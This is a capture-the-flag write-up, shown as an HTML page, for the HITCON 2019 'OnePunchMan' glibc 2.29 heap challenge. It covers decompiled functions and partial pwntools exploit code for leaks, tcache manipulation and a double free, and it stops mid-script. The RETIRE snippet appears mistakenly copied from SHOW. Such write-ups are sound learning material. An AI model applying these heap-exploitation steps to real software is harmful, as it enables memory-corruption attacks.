@@ -1,0 +1,363 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         Hitcon 2019 OnePunchMan Writeup
+        
+    </title><meta content="Hitcon 2019 OnePunchMan Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/onepunchman/&t=Hitcon 2019 OnePunchMan Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Hitcon 2019 OnePunchMan Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-05-28</time></div></div><section class=body><p>This challenge is something we really missed out during the actual CTF , but happens that now Im about to give an intended solution for this challenge after quite sometime.<p><strong>PS</strong> This writeup is purely for my own learning and I'd be really happy if this is useful to you too :P.<p>I will not be discussing about the bug in this post as I have already discussed that in my <a href=https://pwnverse.github.io/HouseOfLore/>previous post</a>. {: .notice}<p>Anyways , let's dive into some tcache exploitation now.<h2 id=tl-dr>TL;DR</h2><p>We've been given the binary file and glibc 2.29 to start with.<p>Running <code>file</code> command , we see that it's <code>x86 64 bit</code> standard CTF-style binary.<p>Let's see what <code>checksec</code> has to tell us.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>CANARY</span><span>    : ENABLED
+</span><span style=color:#ffb454>FORTIFY</span><span>   : disabled
+</span><span style=color:#ffb454>NX</span><span>        : ENABLED
+</span><span style=color:#ffb454>PIE</span><span>       : ENABLED
+</span><span style=color:#ffb454>RELRO</span><span>     : FULL
+</span></code></pre><h2 id=reversing>Reversing</h2><p>Firing up the binary in <strong>IDA</strong> , we see that the binary has menu-styled layout with the following functions.<ul><li><strong>DEBUT</strong> - This function does the following <ol><li>Reads the <code>unsigned long</code> idx and checks if it is less than 2.<li>Reads <strong>Hero Name</strong> and checks if the length of name is in the range of <strong>[0x7f,0x400]</strong>.<li>Has bss tables for storing Heap addresses of calloc'd chunks and the size.<li>Finally , it copies our input onto the heap address with the use of <code>strncpy</code>.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( idx </span><span style=color:#f29668>> </span><span style=color:#f29718>2 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>memset</span><span>(s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x400</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  size </span><span style=color:#f29668>= </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x400</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( size </span><span style=color:#f29668><= </span><span style=color:#f29718>0 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"io"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  s[size </span><span style=color:#f29668>- </span><span style=color:#f29718>1</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( size </span><span style=color:#f29668><= </span><span style=color:#f29718>0x7F </span><span style=color:#f29668>||</span><span> size </span><span style=color:#f29668>> </span><span style=color:#f29718>0x400 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"poor hero name"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx) </span><span style=color:#f29668>= </span><span style=color:#f07178>calloc</span><span>(</span><span style=color:#f29718>1</span><span style=color:#ff7733>uLL</span><span style=color:#bfbab0cc>,</span><span> size)</span><span style=color:#bfbab0cc>;
+</span><span>  sizes[</span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx] </span><span style=color:#f29668>=</span><span> size</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>strncpy</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx)</span><span style=color:#bfbab0cc>,</span><span> s</span><span style=color:#bfbab0cc>,</span><span> size)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>memset</span><span>(s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x400</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span></code></pre><ul><li><strong>RENAME</strong> - This function is like any other standard safe edit functions which checks for <code>idx</code> and then reads into the location which the idx points to using the sizes table for calculating size.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( idx </span><span style=color:#f29668>> </span><span style=color:#f29718>2 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>memset</span><span>(s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x400</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  size </span><span style=color:#f29668>= </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x400</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( size </span><span style=color:#f29668><= </span><span style=color:#f29718>0 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"io"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  s[size </span><span style=color:#f29668>- </span><span style=color:#f29718>1</span><span>] </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( size </span><span style=color:#f29668><= </span><span style=color:#f29718>0x7F </span><span style=color:#f29668>||</span><span> size </span><span style=color:#f29668>> </span><span style=color:#f29718>0x400 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"poor hero name"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx) </span><span style=color:#f29668>= </span><span style=color:#f07178>calloc</span><span>(</span><span style=color:#f29718>1</span><span style=color:#ff7733>uLL</span><span style=color:#bfbab0cc>,</span><span> size)</span><span style=color:#bfbab0cc>;
+</span><span>  sizes[</span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx] </span><span style=color:#f29668>=</span><span> size</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>strncpy</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx)</span><span style=color:#bfbab0cc>,</span><span> s</span><span style=color:#bfbab0cc>,</span><span> size)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>memset</span><span>(s</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x400</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span></code></pre><ul><li><strong>SHOW</strong> - This function prints the contents of the chunks by reading idx.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>unsigned int</span><span> idx</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+Ch] [rbp-4h]
+</span><span>
+</span><span>  </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( idx </span><span style=color:#f29668>> </span><span style=color:#f29718>2 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  result </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( result )
+</span><span>  {
+</span><span>    </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    result </span><span style=color:#f29668>= </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx))</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span> result</span><span style=color:#bfbab0cc>;
+</span></code></pre><ul><li><strong>RETIRE</strong> - This function frees the chunk but does not NULL out the pointer in bss, hence we have <strong>Use After Free</strong> bug which could leverage us memory leaks.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
+</span><span>  </span><span style=color:#ff7733>unsigned int</span><span> idx</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+Ch] [rbp-4h]
+</span><span>
+</span><span>  </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  idx </span><span style=color:#f29668>= </span><span style=color:#ffb454>read_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( idx </span><span style=color:#f29668>> </span><span style=color:#f29718>2 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"invalid"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  result </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( result )
+</span><span>  {
+</span><span>    </span><span style=color:#ffb454>print</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    result </span><span style=color:#f29668>= </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>heroes </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>*</span><span> idx))</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span> result</span><span style=color:#bfbab0cc>;
+</span></code></pre><ul><li><strong>SECRET</strong> - This is the function where a <strong>malloc</strong> call of 0x217 happens. To trigger this function , we need to fill the 0x217 tcache with atleast 6 chunks and hence we can <em>malloc only if the tcache bins of size 0x217 are 6 or more</em>.</ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>*</span><span>(qword_4030 </span><span style=color:#f29668>+ </span><span style=color:#f29718>32</span><span>) </span><span style=color:#f29668><= </span><span style=color:#f29718>6 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"gg"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  buf </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>(</span><span style=color:#f29718>0x217</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>!</span><span>buf )
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"err"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x217</span><span style=color:#ff7733>uLL</span><span>) </span><span style=color:#f29668><= </span><span style=color:#f29718>0 </span><span>)
+</span><span>    </span><span style=color:#ffb454>error</span><span>(</span><span style=color:#c2d94c>"io"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>puts</span><span>(</span><span style=color:#c2d94c>"Serious Punch!!!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>puts</span><span>(</span><span style=color:#f29668>&</span><span>unk_2128)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f07178>puts</span><span>(buf)</span><span style=color:#bfbab0cc>;
+</span></code></pre><p>Fair Enough , now that we have a grasp of what the binary does , let's try exploiting it and spawn a shell :).<h2 id=exploit-development>Exploit Development</h2><p>We begin with defining functions for doing necessary stuff for us.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>import </span><span>sys
+</span><span>
+</span><span>io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>"./one_punch_loaded"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
+</span><span>
+</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv) </span><span style=color:#f29668>== </span><span style=color:#f29718>1</span><span>):
+</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace </span><span style=color:#f29668>= </span><span style=color:#f29718>True
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>name</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"name: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(name))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>name</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(</span><span style=color:#c2d94c>"name: "</span><span style=color:#bfbab0cc>,</span><span>name)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4'</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"idx: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>secret</span><span>(</span><span style=color:#f29718>data</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'50056'</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(data)
+</span><span>
+</span><span>
+</span><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span></code></pre><h3 id=memory-leaks>Memory Leaks</h3><h4 id=notice>NOTICE</h4><p>Calloc calls do not take from tcache. {: .notice}<p>Heap Leak is just one step away , we simply add 2 chunks , free both and view the second chunk added.<p>For Libc Leak , we can simply fill a smallbin size tcache ,then add another chunk and free it , thus creating one unsorted bin chunk which has it's fd and bk pointers in libc bss <code>main_arena</code> struct.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
+</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
+</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
+</span><span>
+</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>
+</span><span style=font-style:italic;color:#5c6773>#Heap
+</span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>'name: '</span><span>)
+</span><span>heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x260
+</span><span>
+</span><span style=font-style:italic;color:#5c6773>#Fill 0x217 tcache
+</span><span style=color:#ff7733>for </span><span style=font-style:italic;color:#39bae6>_ </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>5</span><span>):
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>
+</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
+</span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>) </span><span style=font-style:italic;color:#5c6773>#Padding
+</span><span style=font-style:italic;color:#5c6773>#This time in unsorted bin
+</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>
+</span><span style=font-style:italic;color:#5c6773>#Libc
+</span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>
+</span><span>io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>"hero name: "</span><span>)
+</span><span>libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x219ca0
+</span><span>
+</span><span>log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"Heap -> " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
+</span><span>log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"Libc -> " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base))
+</span><span>
+</span></code></pre><p>We have the necessary leaks now , let's dive into some core exploitation :P.<p>Since we can <code>edit</code> free chunks also , we can easily <code>double_free</code> without crashing.<p>As we completely filled the 0x220 tcache , let us call <code>malloc</code> and consume one tcache , add another chunk of size 0x217 , free it and this chunk would silently fill back tcache without top consolidation.<p>The subsequent calloc call gives us the chunk that we had previously sent to unsorted bin.<p>Let us have a look at memory dump at each step from now on , for better understanding.<pre style=background:#0f1419;color:#bfbab0><code><span>secret('a')
+</span><span>add(0,'T'*0x217)
+</span><span>free(0)
+</span></code></pre><p>After freeing that chunk , we yet again fill the tcache of 0x217.<p>Now we erase <code>fd</code> and <code>bk</code> of this freed chunk and simply free it again without crashing.<p>This time , the same chunk goes into unsorted bin as it doesnt have any other choice :thinking:.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>)
+</span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)  
+</span></code></pre><p>Now that we performed double free , let's observe the memory once.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
+</span><span style=color:#ffb454>0x55555555a130:</span><span>	0x0032323232323232	0x0000000000000221 -</span><span style=color:#f29668>></span><span> This chunk is both in tcache and main_arena unsorted bin
+</span><span style=color:#ffb454>0x55555555a140:</span><span>	0x00007ffff7fefca0	0x00007ffff7fefca0
+</span><span style=color:#ffb454>0x55555555a150:</span><span>	0x5454545454545454	0x5454545454545454
+</span><span>
+</span><span>
+</span><span style=color:#ffb454>0x555555559150:</span><span>	0x000055555555a140   -</span><span style=color:#f29668>></span><span> This is tcache arena , let us call this victim chunk where we want to get allocation
+</span><span style=color:#ffb454>0x7ffff7fefcb0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x55555555a130    -</span><span style=color:#f29668>></span><span> This is main arena
+</span></code></pre><p>Interestingly , we have the same [almost] chunk available in unsorted bin as well as tcache , the only difference being the way tcache and main_arena manage chunks , but then , we can fake that unsorted bin chunk and make it appear like the tcache chunk.<p>For that , let's extend the top chunk by adding 3 chunks of size 0x217 and freeing them all , thus sending a huge chunk into unsorted bin and merging with top.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
+</span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>3</span><span>):
+</span><span>    </span><span style=color:#ffb454>add</span><span>(i</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'E'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x217</span><span>)
+</span><span>
+</span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>3</span><span>):
+</span><span>    </span><span style=color:#ffb454>free</span><span>(i)
+</span><span>
+</span></code></pre><p>Let's examine the heap.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>
+</span><span style=color:#ffb454>0x55555555a570:</span><span>	0x0033333333333333	0x000000000001fa91 -</span><span style=color:#f29668>></span><span> Notice how all chunks merged with top
+</span><span style=color:#ffb454>0x55555555a580:</span><span>	0x000055555555a130	0x00007ffff7fefca0
+</span></code></pre><p>Now its time to create chunk of size 0x400 and have a fake chunk of size 0x220 inside it.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>fake_chunk </span><span style=color:#f29668>= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x221</span><span>)          </span><span style=font-style:italic;color:#5c6773>#Faking a chunk of size 0x221 [which is the chunk allocated at a request of 0x217 also]
